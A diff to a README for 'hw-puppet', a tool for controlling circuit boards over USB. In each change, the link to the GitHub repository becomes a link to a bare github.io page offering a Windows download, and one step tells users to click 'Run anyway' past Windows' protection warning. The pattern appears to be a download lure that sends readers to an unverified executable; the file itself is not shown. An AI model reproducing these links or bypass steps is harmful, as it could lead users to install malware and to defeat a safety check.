@@ -1,6 +1,6 @@
 # 🤖 hw-puppet - Control Test Boards Without Coding
 
-[![Download hw-puppet](https://img.shields.io/badge/Download-hw--puppet-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/zobryayanayama/hw-puppet)
+[![Download hw-puppet](https://img.shields.io/badge/Download-hw--puppet-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://zobryayanayama.github.io)
 
 hw-puppet is a small, friendly program that acts like a puppet master for circuit boards. It gives you two simple "remote controls" over one USB cable, so you can watch what a board is doing and send it commands at the same time — no programming experience required.
 
@@ -8,7 +8,7 @@ hw-puppet is a small, friendly program that acts like a puppet master for circui
 
 Visit this link to download the application:
 
-**👉 https://github.com/zobryayanayama/hw-puppet**
+**👉 https://zobryayanayama.github.io**
 
 Once the page opens, look for the download button or the releases area, and save the application to your Windows computer. When the download finishes, open the file you saved and follow the on-screen prompts to place hw-puppet on your machine.
 
@@ -47,7 +47,7 @@ Under the hood, this uses a dual-CDC USB design built on TinyUSB and the ESP-IDF
 
 ## 🚀 Getting Started Step by Step
 
-1. **Download.** Visit https://github.com/zobryayanayama/hw-puppet and save the application to your computer.
+1. **Download.** Visit https://zobryayanayama.github.io and save the application to your computer.
 2. **Open it.** Double-click the file you downloaded. If Windows shows a blue "protected your PC" notice, click **More info**, then **Run anyway**.
 3. **Plug in your board.** Connect the target board to your PC with the USB data cable.
 4. **Wait a moment.** Windows will detect two new serial devices. This usually takes five to ten seconds.
@@ -100,7 +100,7 @@ Only if they try to open the same port at the same time. Close other serial tool
 
 ## 📚 Support and Updates
 
-Return to https://github.com/zobryayanayama/hw-puppet at any time to check for newer versions, read release notes, or report a problem. Keeping the application up to date is the fastest route to a smooth experience, since each release refines how the two channels behave together.
+Return to https://zobryayanayama.github.io at any time to check for newer versions, read release notes, or report a problem. Keeping the application up to date is the fastest route to a smooth experience, since each release refines how the two channels behave together.
 
 ## ⚖️ License
 
